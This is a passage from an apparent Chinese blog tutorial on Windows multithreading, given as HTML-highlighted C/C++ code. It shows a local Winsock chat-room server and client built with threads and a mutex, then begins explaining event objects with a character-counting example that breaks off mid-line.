class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">listen</span>(sockSer, <span class="number">5</span>))&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;listen error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;start listen!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">SOCKADDR_IN addrCli;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环接收消息</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="comment">//来自客户端的连接</span></span><br><span class="line">SOCKET sockConn = <span class="built_in">accept</span>(sockSer, (SOCKADDR *)&amp;addrCli, &amp;len);</span><br><span class="line"></span><br><span class="line"><span class="comment">//启用线程处理客户端</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hMutex, INFINITE);<span class="comment">//上锁</span></span><br><span class="line">clnSocks[clntCnt++] = sockConn;<span class="comment">//clntCnt++ 右边自增，效果一样</span></span><br><span class="line"><span class="built_in">ReleaseMutex</span>(hMutex);<span class="comment">//解锁</span></span><br><span class="line"></span><br><span class="line">hThread = (HWND)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, HandleCln, (<span class="type">void</span> *)&amp;sockConn, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Connect Num = %d, client ip: %s\n&quot;</span>,clntCnt, <span class="built_in">inet_ntoa</span>(addrCli.sin_addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>常用的框架就很自然的copy</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Client start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端要做的事情</p><ol><li>请求连接上线，发送给客户端</li><li>等待服务端消息</li><li>等待用户自己下线消息</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NAME_SIZE 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BUF_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szName[NAME_SIZE] = <span class="string">&quot;[DEFAULT]&quot;</span>;<span class="comment">//默认客户端的昵称</span></span><br><span class="line"><span class="type">char</span> szMsg[MAX_BUF_SIZE];<span class="comment">//收发用的buffer</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//console error tips</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHanding</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_msg)</span></span>&#123;</span><br><span class="line"><span class="built_in">fputs</span>(_msg, stderr);</span><br><span class="line"><span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Client start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;必须以命令行启动,且输入两个参数,包括昵称!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;例如:  MyThreadClient.exe name&quot;</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构建初始化套接字，直接照搬</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line">SOCKET hSock;</span><br><span class="line">SOCKADDR_IN serAdr;</span><br><span class="line">HANDLE hSendThread;<span class="comment">//接受线程</span></span><br><span class="line">HANDLE hRecvThread;<span class="comment">//发送线程</span></span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建服务器套接字，也直接照搬之前写的</span></span><br><span class="line">SOCKET sockSer = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSer)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;socket error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充参数</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;serAdr, <span class="number">0</span>, <span class="built_in">sizeof</span>(serAdr));</span><br><span class="line">serAdr.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">serAdr.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">serAdr.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大部分都是照搬的，在客户端的使用上，用了之前main自带的参数做了命令行启动的效果。</p><p><strong>完整的客户端</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NAME_SIZE 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BUF_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szName[NAME_SIZE] = <span class="string">&quot;[DEFAULT]&quot;</span>;<span class="comment">//默认客户端的昵称</span></span><br><span class="line"><span class="type">char</span> szMsg[MAX_BUF_SIZE];<span class="comment">//收发用的buffer</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//console error tips</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHanding</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_msg)</span></span>&#123;</span><br><span class="line"><span class="built_in">fputs</span>(_msg, stderr);</span><br><span class="line"><span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">SendMsg</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="comment">//处理线程的标记</span></span><br><span class="line">SOCKET hClntSock = *((SOCKET *)arg);</span><br><span class="line"><span class="type">char</span> szNameMsg[NAME_SIZE + MAX_BUF_SIZE] = &#123; <span class="number">0</span> &#125;;<span class="comment">//需要昵称和消息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">memset</span>(szMsg, <span class="number">0</span>, MAX_BUF_SIZE);</span><br><span class="line"><span class="comment">//等待客户端在控制台输入的消息</span></span><br><span class="line"><span class="built_in">fgets</span>(szMsg, MAX_BUF_SIZE, stdin);</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理客户端主动下线</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(szMsg, <span class="string">&quot;Q\n&quot;</span>) || !<span class="built_in">strcmp</span>(szMsg, <span class="string">&quot;q\n&quot;</span>))&#123;</span><br><span class="line"><span class="built_in">closesocket</span>(hClntSock);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取到消息后发送给服务器</span></span><br><span class="line"><span class="built_in">sprintf</span>(szNameMsg, <span class="string">&quot;%s %s&quot;</span>, szName, szMsg);</span><br><span class="line"><span class="built_in">send</span>(hClntSock, szNameMsg, <span class="built_in">strlen</span>(szNameMsg), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">RecvMsg</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="comment">//处理线程的标记</span></span><br><span class="line">SOCKET hClntSock = *((SOCKET *)arg);</span><br><span class="line"><span class="type">char</span> szNameMsg[NAME_SIZE + MAX_BUF_SIZE] = &#123; <span class="number">0</span> &#125;;<span class="comment">//需要昵称和消息</span></span><br><span class="line"><span class="type">int</span> iLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">memset</span>(szNameMsg, <span class="number">0</span>, NAME_SIZE + MAX_BUF_SIZE);</span><br><span class="line"><span class="comment">//等待来自客户端的消息</span></span><br><span class="line">iLen = <span class="built_in">recv</span>(hClntSock, szNameMsg, <span class="built_in">sizeof</span>(szNameMsg), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果服务端断开</span></span><br><span class="line"><span class="keyword">if</span> (iLen == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">szNameMsg[iLen] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">fputs</span>(szNameMsg, stdout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Client start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;必须以命令行启动,且输入两个参数,包括昵称!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;例如:  MyThreadClient.exe name&quot;</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sprintf</span>(szName, <span class="string">&quot;[%s]:&quot;</span>, argv[<span class="number">1</span>]);<span class="comment">//根据命令行输入的参数初始化name</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//构建初始化套接字，直接照搬</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line">SOCKADDR_IN serAdr;</span><br><span class="line">HANDLE hSendThread;<span class="comment">//接受线程</span></span><br><span class="line">HANDLE hRecvThread;<span class="comment">//发送线程</span></span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建服务器套接字，也直接照搬之前写的</span></span><br><span class="line">SOCKET sockSer = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSer)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;socket error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充参数</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;serAdr, <span class="number">0</span>, <span class="built_in">sizeof</span>(serAdr));</span><br><span class="line">serAdr.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">serAdr.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">serAdr.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//连接服务器</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">connect</span>(sockSer, (SOCKADDR *)&amp;serAdr, <span class="built_in">sizeof</span>(serAdr)) == SOCKET_ERROR)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;connect error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//给服务端发送消息，启用线程安排</span></span><br><span class="line">hSendThread = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, SendMsg, (<span class="type">void</span> *)&amp;sockSer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//接收服务端的消息</span></span><br><span class="line">hRecvThread = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, RecvMsg, (<span class="type">void</span> *)&amp;sockSer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待内核对象执行完毕</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hSendThread, INFINITE);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hRecvThread, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockSer);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>老样子先跑服务端在跑客户端</p><img src="/2022/07/18/thread/014.png" class=""><p>ok，成功启用，没啥问题。本地回环的设置是这样。</p><p>然后多启动一个，也能跑出来。</p><img src="/2022/07/18/thread/015.png" class=""><p>然后客户端发消息给服务器</p><img src="/2022/07/18/thread/016.png" class=""><p>服务器接收到之后转发，可以看到客户端同样是接收到了先前发送的消息</p><p>再开一台</p><img src="/2022/07/18/thread/017.png" class=""><p>实际效果都差不多，就是达到一个简易版的聊天室。</p><img src="/2022/07/18/thread/018.png" class=""><p>关闭其中一台会看到连接数少了。</p><p>然后用我们之前写的方法，输入的q或者Q同样代表退出</p><img src="/2022/07/18/thread/019.png" class=""><img src="/2022/07/18/thread/020.png" class=""><p>效果都是没问题的。</p><blockquote><p>值得一提的是，也是小缺点，就是客户端发送的消息，服务器广播会又发下来，简单来说就是客户端a发的消息，会被服务器广播，然后客户a又收到了自己发的消息。</p></blockquote><hr><h2 id="线程同步-事件对象"><a href="#线程同步-事件对象" class="headerlink" title="线程同步-事件对象"></a>线程同步-事件对象</h2><p>前面整过互斥对象了，用<code>CreatrMutex</code>创建对象，作用就是变相的上锁，让线程操作内存的时候有序的进行。</p><p>而事件对象也属于内核对象，它有三个成员</p><ol><li>使用计数</li><li>用于指明事件是一个自动重置的事件还是一个人工重置的事件，用布尔值表示</li><li>用于指明该事件处于已通知状态还是未通知状态，同用布尔值表示</li></ol><p>事件对象的两种类型</p><ol><li>人工重置的事件对象</li><li>自动重置的事件对象</li></ol><p>事件对象的方法</p><ol><li>创建-调用<code>CreateEvent</code>函数创建或者打开一个命名的或者匿名的事件对象</li><li>设置状态-调用<code>SetEvent</code>函数把指定的事件对象设置为有信号状态</li><li>重置状态-调用<code>ResetEvent</code>函数把指定的事件对象设置为无信号状态</li><li>请求事件对象-调用<code>WaitForSingleObject</code>函数请求事件对象</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateEventW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes,<span class="comment">//安全属性默认都NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOL bManualReset,<span class="comment">//复位方式 TRUE 必须用ResetEvent复原，FALSE自动还原无信号状态</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOL bInitialState,<span class="comment">//初始状态 TRUE初始状态为有信号状态 FALSE无信号状态</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpName<span class="comment">//对象名称 NULL 无名的事件对象</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CreateEvent  CreateEventW</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CreateEvent  CreateEventA</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure><p>反正这些要么在编译器里转到定义，要么上文档翻译一下看看大致作用。</p><hr><p>用线程去统计字符串</p><ol><li>一个统计字符串含A</li><li>一个统计非A</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> str[<span class="number">100</span>];<span class="comment">//字符串</span></span><br><span class="line">HANDLE hEvent;<span class="comment">//句柄</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfA</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);<span class="comment">//一直等待</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] == <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A count number = %d\n&quot;</span>, count);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfOthers</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);<span class="comment">//一直等待</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] != <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;others char count number = %d\n&quot;</span>, count);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">HANDLE hThread1, hThread2;</span><br><span class="line"><span class="built_in">fputs</span>(<span class="string">&quot;Pleas Input string:\n&quot;</span>,stdout);</span><br><span class="line"><span class="built_in">fgets</span>(str, <span class="number">100</span>, stdin);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个自动重置的事件，初始值为无信号状态</span></span><br><span class="line"><span class="comment">//hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//两个线程分别统计A和其它成员个数</span></span><br><span class="line">hThread1 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, NumberOfA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = 